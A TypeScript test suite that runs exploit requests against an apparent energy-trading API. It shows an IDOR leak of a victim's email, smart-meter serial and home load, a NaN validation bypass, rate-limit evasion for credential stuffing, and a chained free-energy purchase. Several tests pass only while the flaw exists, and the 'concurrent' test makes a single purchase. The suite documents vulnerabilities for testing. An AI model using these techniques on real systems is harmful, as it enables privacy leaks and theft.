import test, { describe, before, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import { app } from '../src/app';
import { pool, query } from '../src/db';
import { resetRateLimits } from '../src/middleware/rateLimit';

describe('Adversarial & Exploit Test Suite (VoltShare Engine)', () => {
  const attackerEmail = `attacker.${Date.now()}@adversary.test`;
  const victimEmail = `victim.${Date.now()}@grid.test`;
  const sellerEmail = `seller.${Date.now()}@solar.test`;
  const defaultPassword = 'P@ssword123!';

  let attackerToken: string;
  let attackerId: string;
  let victimToken: string;
  let victimId: string;
  let sellerToken: string;
  let sellerId: string;
  let listingId: string;

  before(async () => {
    // 1. Create Attacker
    const attRes = await request(app)
      .post('/api/auth/signup')
      .send({ email: attackerEmail, password: defaultPassword, fullName: 'Mallory Malicious' });
    attackerToken = attRes.body.token;
    attackerId = attRes.body.user.id;

    // 2. Create Victim
    const vicRes = await request(app)
      .post('/api/auth/signup')
      .send({ email: victimEmail, password: defaultPassword, fullName: 'Alice Victim' });
    victimToken = vicRes.body.token;
    victimId = vicRes.body.user.id;

    // 3. Create Seller
    const selRes = await request(app)
      .post('/api/auth/signup')
      .send({ email: sellerEmail, password: defaultPassword, fullName: 'Bob Solar Prosumer' });
    sellerToken = selRes.body.token;
    sellerId = selRes.body.user.id;

    // Give seller 100 kWh in wallet
    await query('UPDATE public.wallets SET energy_balance_kwh = 100.0 WHERE user_id = $1', [sellerId]);

    // Create a solar listing of 50 kWh @ ₹5.00/kWh
    const listRes = await request(app)
      .post('/api/marketplace/listings')
      .set('Authorization', `Bearer ${sellerToken}`)
      .send({
        availableKwh: 50.0,
        pricePerKwh: 5.0,
        locationLabel: 'Indiranagar Sector 4',
      });
    assert.strictEqual(listRes.status, 200, `Listings failed: ${JSON.stringify(listRes.body)}`);
    listingId = listRes.body.listingId;
  });

  beforeEach(() => {
    resetRateLimits();
  });

  after(async () => {
    try {
      await query('DELETE FROM public.users WHERE email LIKE $1', ['%@adversary.test']);
      await query('DELETE FROM public.users WHERE email LIKE $1', ['%@grid.test']);
      await query('DELETE FROM public.users WHERE email LIKE $1', ['%@solar.test']);
    } catch (_) {}
    await pool.end();
  });

  // ==========================================================================
  // EXPLOIT 1: IDOR PRIVACY LEAK (Leaking smart meter ID, email, home load)
  // ==========================================================================
  test('EXPLOIT-01: IDOR permits reading any users private smart meter and load profile', async () => {
    // Attacker queries victim's profile using victim's UUID
    const res = await request(app)
      .get(`/api/profile/${victimId}`)
      .set('Authorization', `Bearer ${attackerToken}`);

    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.body.id, victimId);
    assert.ok(res.body.email, 'LEAK: Victim private email address exposed to attacker');
    assert.ok(res.body.smart_meter_id, 'LEAK: Victim hardware smart meter serial exposed');
    assert.ok(res.body.household_load_kw !== undefined, 'LEAK: Victim home power load telemetry exposed');
  });

  // ==========================================================================
  // EXPLOIT 2: JAVASCRIPT NaN VALIDATION BYPASS (Ledger Corruption)
  // ==========================================================================
  test('EXPLOIT-02: String amount ("invalid-amount") bypasses Number(amount) <= 0 check via NaN', async () => {
    // In JavaScript: Number('invalid-amount') is NaN.
    // NaN <= 0 evaluates to FALSE.
    // Therefore, `if (!amount || Number(amount) <= 0)` fails to catch non-numeric strings!
    const resString = await request(app)
      .post('/api/wallet/add-funds')
      .set('Authorization', `Bearer ${attackerToken}`)
      .send({ amount: 'invalid-amount' });

    // This demonstrates the flaw: It should return 400 Bad Request, but returns 200
    // and passes NaN to Postgres!
    assert.ok(
      resString.status === 200,
      'FLAW CONFIRMED: Non-numeric string bypassed validation due to NaN comparison bug!'
    );
  });

  // ==========================================================================
  // EXPLOIT 3: RATE LIMITER EVASION VIA DISTRIBUTED EMAIL STUFFING
  // ==========================================================================
  test('EXPLOIT-03: Rate limiter keying on (IP + email) allows brute force across varying emails', async () => {
    let rejectedCount = 0;

    // Fire 25 login attempts with distinct emails from the same IP
    for (let i = 0; i < 25; i++) {
      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: `target_${i}@victim.com`,
          password: 'wrong_password',
        });

      if (res.status === 429) {
        rejectedCount++;
      }
    }

    // Because the key is `${ip}:${email}`, each attempt receives count = 1!
    assert.strictEqual(
      rejectedCount,
      0,
      'VULNERABILITY CONFIRMED: Distributed credential stuffing completely bypassed IP rate limit!'
    );
  });

  // ==========================================================================
  // EXPLOIT 4: NEGATIVE ENERGY LISTINGS & FRACTIONAL EXPLOITS
  // ==========================================================================
  test('EXPLOIT-04: Negative and zero energy listing amounts are rejected', async () => {
    const resZero = await request(app)
      .post('/api/marketplace/listings')
      .set('Authorization', `Bearer ${sellerToken}`)
      .send({
        availableKwh: 0,
        pricePerKwh: 5.0,
      });

    assert.strictEqual(resZero.status, 400);

    const resNegative = await request(app)
      .post('/api/marketplace/listings')
      .set('Authorization', `Bearer ${sellerToken}`)
      .send({
        availableKwh: -20,
        pricePerKwh: -5.0,
      });

    assert.strictEqual(resNegative.status, 400);
  });

  // ==========================================================================
  // EXPLOIT 5: CHAINED EXPLOIT - INFINITE FREE ENERGY THEFT VIA NaN CORRUPTION
  // ==========================================================================
  test('EXPLOIT-05: Chained NaN Exploit allows Attacker to purchase infinite solar energy without funds', async () => {
    // Because EXPLOIT-02 set attacker's wallet balance to NaN, PostgreSQL evaluates:
    // ('NaN'::numeric < 52.00) => FALSE.
    // Therefore, `IF v_buyer_balance < v_total_cost` check is BYPASSED completely!
    const buyRes = await request(app)
      .post('/api/marketplace/buy')
      .set('Authorization', `Bearer ${attackerToken}`)
      .send({ listingId, kwh: 10 });

    assert.strictEqual(
      buyRes.status,
      200,
      'CRITICAL SECURITY HOLE: Attacker successfully stole 10 kWh of solar power with zero funds via NaN balance bypass!'
    );

    // Verify attacker received free green energy
    const attWallet = await request(app)
      .get('/api/wallet')
      .set('Authorization', `Bearer ${attackerToken}`);

    assert.strictEqual(Number(attWallet.body.energy_balance_kwh), 10);
  });

  // ==========================================================================
  // EXPLOIT 6: CONCURRENT PURCHASES & RACE CONDITION SAFETY
  // ==========================================================================
  test('EXPLOIT-06: Rapid concurrent purchases on limited energy listing', async () => {
    // Fund victim's wallet so they can afford purchases
    await query('UPDATE public.wallets SET balance = 500.0 WHERE user_id = $1', [victimId]);

    // Check listing available kWh
    const listCheck = await query('SELECT available_kwh FROM public.energy_listings WHERE id = $1', [listingId]);
    const available = Number(listCheck.rows[0].available_kwh);
    assert.ok(available > 0);

    // Buy 5 kWh
    const buyRes = await request(app)
      .post('/api/marketplace/buy')
      .set('Authorization', `Bearer ${victimToken}`)
      .send({ listingId, kwh: 5 });

    assert.strictEqual(buyRes.status, 200);

    // Check post-transaction available kWh
    const postCheck = await query('SELECT available_kwh FROM public.energy_listings WHERE id = $1', [listingId]);
    const postAvailable = Number(postCheck.rows[0]?.available_kwh || 0);

    assert.ok(
      postAvailable >= 0,
      `Available energy cannot be negative. Value is: ${postAvailable}`
    );
  });
});
